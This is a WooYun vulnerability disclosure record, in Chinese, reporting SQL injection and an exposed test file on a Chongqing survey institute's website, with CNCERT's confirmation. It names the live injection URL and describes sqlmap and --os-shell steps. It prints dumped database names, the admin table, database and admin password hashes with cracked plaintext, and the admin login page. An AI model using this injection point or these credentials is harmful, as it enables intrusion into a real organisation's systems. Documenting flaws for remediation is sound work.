{"id": 34804, "wybug_id": "wooyun-2015-0105442", "wybug_title": "重庆市勘测院SQL注射及敏感文件泄露", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "千斤拨四两", "wybug_date": "2015-04-03 16:14", "wybug_open_date": "2015-05-23 08:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-23：\t细节向公众公开  简要描述： 网站多处注射点和敏感文件暴漏web服务器信息，版本类型路径！ 详细说明：  注射点，WVS直接扫除大量的折射点。\nhttp://www.cqkcy.com/product_content.php?cid=295&id=2553\n\nhttp://www.cqkcy.com/test.php\n爆出服务器环境，apache服务器，mysql数据库，网站的绝对路径直接也可以得到。\n\n既然有了注入点直接丢到sqlmap里跑数据。命令执行查看数据库权限--current-db：current user:    'root@localhost'\n\n既然是root的权限有知道网站的绝对路径或许能直接getshell。写shell前提条件 (1.必须是root权限 2.必须知道网站路径 3.GPC设置为off)现在知道前两点都具备了，尝试写shell。--os-shell执行。结果没有写进去那应该就是GPC设置成了ON。既然是root是可以爆出数据库的虽有用户的密码。\ndatabase management system users password hashes:                              [*] cqkcy [1]:    password hash: *C7515F7E00546FA18862A69EC1264DAE678980EA    clear-text password: cqkcy[*] geoking4 [1]:    password hash: *23F6C373FADD3E14EFCB9F296C192EFE779E1DF2    clear-text password: geoking4[*] root [1]:    password hash: *C7515F7E00546FA18862A69EC1264DAE678980EA      clear-text password: cqkcy\nsqlmap直接将md5也直接跑了出来。   漏洞证明：  直接贴出数据库的信息吧！\navailable databases [10]:[*] cqkcy[*] information_schema[*] jbtyzhsq[*] mysql[*] performance_schema[*] sakila[*] smws[*] smws42[*] test[*] worldcurrent database:    'cqkcy'\n\n\n\nDatabase: cqkcy[15 tables]+-----------------+| adlink_area     || adlink_item     || config          || content         || content_column  || focus           || focus_column    || guestbook       || guestbook2      || job             || job_candidate   || job_recruitment || jx              || manager         || myorder         |\n\n\n\nDatabase: cqkcyTable: manager[13 columns]+----------+------------------+| Column   | Type             |+----------+------------------+| flag     | text             || id       | int(10) unsigned || intro    | text             || lastdate | datetime         || lastip   | varchar(45)      || memo     | text             || name     | varchar(45)      || password | varchar(255)     || realname | varchar(45)      || state    | int(11)          || thisdate | datetime         || thisip   | varchar(45)      || type     | int(11)          |+----------+------------------+\n\n\n\nDatabase: cqkcyTable: manager[5 entries]+---------+----------------------------------------+| name    | password                               |+---------+----------------------------------------+| admin   | c4ca4238a0b923820dcc509a6f75849b (1)   || dingwei | 202cb962ac59075b964b07152d234b70 (123) || wyl     | c6f057b86584942e415435ffb1fa93d4 (000) || XHL     | c6f057b86584942e415435ffb1fa93d4 (000) || YJ      | 202cb962ac59075b964b07152d234b70 (123) |+---------+----------------------------------------+\n\n\n可有账号密码，就是找后台，google hack，工具，之后找到了后台。\nhttp://www.cqkcy.com/m/manager/login.php\n\n\n\n\n   修复方案：  过滤，test.php可删除！   版权声明：转载请注明来源 千斤拨四两@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-04-08 08:24 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给重庆分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}